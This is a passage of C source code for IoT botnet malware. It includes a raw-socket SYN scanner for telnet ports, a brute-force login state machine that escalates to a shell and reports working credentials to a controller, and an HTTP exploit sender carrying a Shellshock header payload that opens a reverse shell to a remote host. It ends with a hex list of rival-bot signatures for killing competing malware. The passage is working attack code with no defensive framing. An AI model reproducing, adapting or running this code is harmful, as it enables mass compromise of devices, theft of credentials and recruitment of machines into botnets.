                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                if (i % 10 == 0)
                {
					port_ = 2323;
                    tcph->dest = HTONS(2323);
                }
                else
                {
					port_ = 23;
                    tcph->dest = HTONS(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, HTONS(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, j83j_rawpkt, sizeof (j83j_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (1)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct j83j_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != HTONS(23) && tcph->source != HTONS(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (HTONL(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (ctableu[n].state == SC_CLOSED)
                {
                    conn = &ctableu[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[j83j] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &ctableu[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[j83j] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[j83j] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &ctableu[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, (void * )(&err), &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[j83j] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[j83j] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (1)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[j83j] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[j83j] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[j83j] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (1)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[j83j] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[j83j] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[j83j] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[j83j] FD%d received shell prompt\n", conn->fd);
#endif
                                // Send enable / system / shell / sh to session to drop into shell if needed
                                send(conn->fd, "enable", 6, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {

#ifdef DEBUG
                                printf("[j83j] FD%d received sh prompt\n", conn->fd);
#endif

                                send(conn->fd, "system", 6, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
			case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;

#ifdef DEBUG
                                printf("[j83j] FD%d received sh prompt\n", conn->fd);
#endif

                                send(conn->fd, "shell", 5, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[j83j] FD%d received enable prompt\n", conn->fd);
#endif

                                send(conn->fd, "sh", 2, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[j83j] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                send(conn->fd, "echo -e '\\x41\\x6b\\x34\\x37'", 26, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[j83j] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) == 10)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[j83j] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[j83j] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, port_, conn->auth, sock);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

char *print_hex_memory(unsigned char *p) {
  int i;
  char tmp[3];
  char *output = malloc(strlen(p)*2+1);
  memset(output, 0, sizeof(output));
  for (i=0;i<strlen(p);i++) {
    sprintf(tmp, "%02x", p[i]);
    strcat(output, tmp);
  }
  return output;
}
int temp;
char*Kvjei9ff = 
    "GET /ucsm/isSamInstalled.cgi HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/%s/9999 0>&1\r\nAccept-Encoding: gzip, deflate\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: close\r\nAccept-Language: en-US,en;q=0.5\r\nUpgrade-Insecure-Requests: 1\r\n\r\n";
#define PORT80_SCANNER_MAX_CONNS 64
#define PORT80_SCANNER_RAW_PPS 128

#define PORT80_SCANNER_RDBUF_SIZE 1024
#define PORT80_SCANNER_HACK_DRAIN 64
struct port80_j83j_connection
{
    int fd, last_recv;
    enum
    {
        PORT80_SC_CLOSED,
        PORT80_SC_CONNECTING,
        PORT80_SC_GET_CREDENTIALS,
        PORT80_SC_EXPLOIT_STAGE2,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[PORT80_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560];
    char nonce_buf[2560];
	char nonce[33];
	char dst[16];
    int credential_index;
};
void port80_xywz();

static void port80_setup_connection(struct port80_j83j_connection *);
static ipv4_t get_random_port80_ip(void);

int port80_j83j_pid = 0, port80_rsck = 0, port80_rsck_out = 0;
char port80_j83j_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct port80_j83j_connection *port80_ctableu;
uint32_t port80__aa = 0;

int port80_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

static void port80_setup_connection(struct port80_j83j_connection *conn)
{
    struct sockaddr_in addr = {0};

    if(conn->fd != -1)
        close(conn->fd);

    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, fcntl(conn->fd, F_GETFL, 0));
int v;
v = fcntl(conn->fd, F_GETFD, 0);
v |= O_NONBLOCK;
struct timeval tv;
tv.tv_sec = 1;
tv.tv_usec = 0;
setsockopt(conn->fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = port80__aa;

    if(conn->state == PORT80_SC_EXPLOIT_STAGE2)
    {
    }
    else
    {
        conn->state = PORT80_SC_CONNECTING;
    }

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

void port80_xywz(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char ip[16];
    // Let parent continue on main thread
    port80_j83j_pid = fork();
    if(port80_j83j_pid > 0 || port80_j83j_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_xywz();
    port80__aa = time(NULL);
    port80_ctableu = calloc(PORT80_SCANNER_MAX_CONNS, sizeof(struct port80_j83j_connection));
    for(i = 0; i < PORT80_SCANNER_MAX_CONNS; i++)
    {
        port80_ctableu[i].state = PORT80_SC_CLOSED;
        port80_ctableu[i].fd = -1;
    }

    // Set up raw socket j83jning and payload
    if((port80_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        _exit(0);
    }
    fcntl(port80_rsck, F_SETFL, O_NONBLOCK | fcntl(port80_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(port80_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        close(port80_rsck);
        _exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    iph = (struct iphdr *)port80_j83j_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = HTONS(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = HTONS(80);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;

	#ifdef DEBUG
        printf("[port80] j83j process initialized. j83jning started.\n");
    #endif

    // Main logic loop
    while(1)
    {
        fd_set fdset_rd, fdset_wr;
        struct port80_j83j_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if(port80__aa != last_spew)
        {
            last_spew = port80__aa;

            for(i = 0; i < PORT80_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)port80_j83j_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = getPIP();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                tcph->dest = HTONS(80);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, HTONS(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(port80_rsck, port80_j83j_rawpkt, sizeof(port80_j83j_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while(1)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct port80_j83j_connection *conn;

            errno = 0;
            n = recvfrom(port80_rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != HTONS(80))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(HTONL(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for(n = last_avail_conn; n < PORT80_SCANNER_MAX_CONNS; n++)
            {
                if(port80_ctableu[n].state == PORT80_SC_CLOSED)
                {
                    conn = &port80_ctableu[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if(conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            port80_setup_connection(conn);
        }

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for(i = 0; i < PORT80_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;

            conn = &port80_ctableu[i];
            //timeout = (conn->state > PORT80_SC_CONNECTING ? 30 : 5);

            if(conn->state != PORT80_SC_CLOSED && (port80__aa - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;
                conn->state = PORT80_SC_CLOSED;
                util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                continue;
            }

            if(conn->state == PORT80_SC_CONNECTING || conn->state == PORT80_SC_EXPLOIT_STAGE2)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != PORT80_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        port80__aa = time(NULL);

        for(i = 0; i < PORT80_SCANNER_MAX_CONNS; i++)
        {
            conn = &port80_ctableu[i];

            if(conn->fd == -1)
                continue;

            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, (void * )(&err), &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == PORT80_SC_EXPLOIT_STAGE2)
                    {
						#ifdef DEBUG
							printf("[port80] FD%d Kvjei9ff_stage=2. sending POST /cgi-bin/telnet.cgi %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
						#endif
                        
						util_zero(ip, sizeof(ip));
						sprintf(ip, "%d.%d.%d.%d", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        sprintf(conn->payload_buf, Kvjei9ff, ip, 80, 1241 + (strlen(ldserver) * 2), print_hex_memory(ldserver));
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        close(conn->fd);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        #ifdef DEBUG
							printf("[port80] FD%d Kvjei9ff_stage=4. closing connection\n", conn->fd);
						#endif
                        conn->fd = -1;
                        conn->state = PORT80_SC_CLOSED;
						continue;
					}
                    else
                    {
                        #ifdef DEBUG
							printf("[port80] FD%d Kvjei9ff_stage=1. connection to %d.%d.%d.%d successful. proceeding to stage 2\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
						#endif
                        conn->state = PORT80_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
					close(conn->fd);
                    conn->fd = -1;
                    conn->state = PORT80_SC_CLOSED;

                    continue;
                }
            }

            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(1)
                {
                    int ret = 0;

                    if(conn->state == PORT80_SC_CLOSED)
                        break;

                    if(conn->rdbuf_pos == PORT80_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + PORT80_SCANNER_HACK_DRAIN, PORT80_SCANNER_RDBUF_SIZE - PORT80_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= PORT80_SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = port80_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, PORT80_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == PORT80_SC_EXPLOIT_STAGE2)
                            {
                                close(conn->fd);
                                port80_setup_connection(conn);
                                continue;
                            }

                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = PORT80_SC_CLOSED;
                            util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = port80__aa;

                    int len = util_strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;
                }
            }
        }
    }
}
void kh74letnac(int wait_usec, int maxfds, int sock) {
    if(!fork()) return;
    int i, res, num_tmps, j;
    char buf[128], cur_dir;
    int max = maxfds;
    fd_set fdset;
    struct timeval tv;
    socklen_t lon;
    int valopt;
    int j83jSock;
    char line[256];
    char *buffer;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = HTONS(23);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    buffer = malloc(BUFFER_SIZE + 1);
    memset(buffer, 0, BUFFER_SIZE + 1);

    struct telstate_t fds[max];

    memset(fds, 0, max * (sizeof(int) + 1));
    for (i = 0; i < max; i++) {
        memset(&(fds[i]), 0, sizeof(struct telstate_t));
        fds[i].complete = 1;
        fds[i].sockbuf = buffer;
    }

    while (1) {
        for (i = 0; i < max; i++) {
            if (fds[i].totalTimeout == 0) {
                fds[i].totalTimeout = time(NULL);
            }

            switch (fds[i].state) {
            case 0:
                {
                    if (fds[i].complete == 1) {
                        // clear the current fd
                        char *tmp = fds[i].sockbuf;
                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;
                        // get a new random ip
                        fds[i].ip = getPIP();
                    } else if (fds[i].complete == 0) {
                        fds[i].passwordInd++;
                        fds[i].usernameInd++;

                        if (fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) {
                            fds[i].complete = 1;
                            continue;
                        }
                        if (fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) {
                            fds[i].complete = 1;
                            continue;
                        }
                    }

                    dest_addr.sin_family = AF_INET;

					if(random_number(1, 10) == 10) {
						fds[i].port = 2323;
                    } else {
						fds[i].port = 23;
					}
										dest_addr.sin_port = HTONS(fds[i].port);

                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                    dest_addr.sin_addr.s_addr = fds[i].ip;

                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);

                    if (fds[i].fd == -1) continue;

                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);

                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
                        reset_telstate(&fds[i]);
                    } else {
                        advance_telstate(&fds[i], 1);
                    }
                }
                break;
            case 1:
                {
//                    sockprintf(sock, "PRIVMSG %s :[AK-47] FOUND ---> %s:23\n", CHAN, get_telstate_host(&fds[i]));
                    FD_ZERO(&fdset);
                    FD_SET(fds[i].fd,&fdset);
                    tv.tv_sec = 0;
                    tv.tv_usec = wait_usec;
                    res = select(fds[i].fd + 1, NULL,&fdset, NULL,&tv);

                    if (res == 1) {
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        //printf("%d\n",valopt);
                        if (valopt) {
                            reset_telstate(&fds[i]);
                        } else {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL)&(~O_NONBLOCK));
                            advance_telstate(&fds[i], 2);
                        }
                        continue;
                    } else if (res == -1) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (fds[i].totalTimeout + 5 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 2:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 3);
                        }

                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 3:
                {
                    if (send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    advance_telstate(&fds[i], 4);
                }
                break;

            case 4:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 5);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 3 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 5:
                {
                    if (send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                  //  sockprintf(sock, "PRIVMSG %s :[AK-47] ATTEMPT ---> %s:23 %s:%s\n", CHAN, get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                    advance_telstate(&fds[i], 6);
                }
                break;

            case 6:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2)) {
                        fds[i].totalTimeout = time(NULL);
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else if (contains_success(fds[i].sockbuf)) {
                            if (fds[i].complete == 2) {
                                reset_telstate(&fds[i]);
                            } else {
                                    sockprintf(sock, "TELNET %s:%u %s:%s\n", get_telstate_host(&fds[i]), fds[i].port, usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                close(j83jSock);
                                reset_telstate(&fds[i]);
                            }
                        } else {
                            reset_telstate(&fds[i]);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            }
        }
    }
}


void hex2bin(const char* in, size_t len, unsigned char* out) {

  static const unsigned char TBL[] = {
     0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  58,  59,
    60,  61,  62,  63,  64,  10,  11,  12,  13,  14,  15
  };

  static const unsigned char *LOOKUP = TBL - 48;

  const char* end = in + len;

  while(in < end) *(out++) = LOOKUP[*(in++)] << 4 | LOOKUP[*(in++)];

}
char *knownBots[] = { // known bots for memory based botkillr
    "584D4E4E43504622", //upx botkill
    "2F6465762F6D6973632F7761746368646F67", //mirai botkill (backdoor botkill???)
    "DEADBEEF", //mirai botkill 1
    "4E4B5156474C4B4C450256574C1222", //mirai botkill 2
    "4C4F4C4E4F4754464F", //qbot botkill 1
    "212A20445550", //qbot botkill 2
    "5453554E414D49", //ziggy botkill
    "50414E20", //ziggy botkill
    "7A6F6C6C617264", //zollard
    "5245504F52542025733A", //generic report botkill
    "64767268656C706572",
    "647672737570706F7274",
    "6D69726169",
    "626C616465",
    "64656D6F6E",
    "686F686F",
    "68616B6169",
    "7361746F7269",
    "6D657373696168",
    "6D697073",
    "6D697073656C",
    "737570657268",
    "61726D7637",
    "61726D7636",
    "69363836",
    "706F7765727063",
    "69353836",
    "6D36386B",
    "7370617263",
    "61726D7634",
    "61726D7635",
    "6B6F736861",
    "796F796F",
    "3434306670",
    "6D696F7269",
    "6E6967676572",
    "6B6F77616973746F726D",
    "6C6F6C6E6F6774666F",
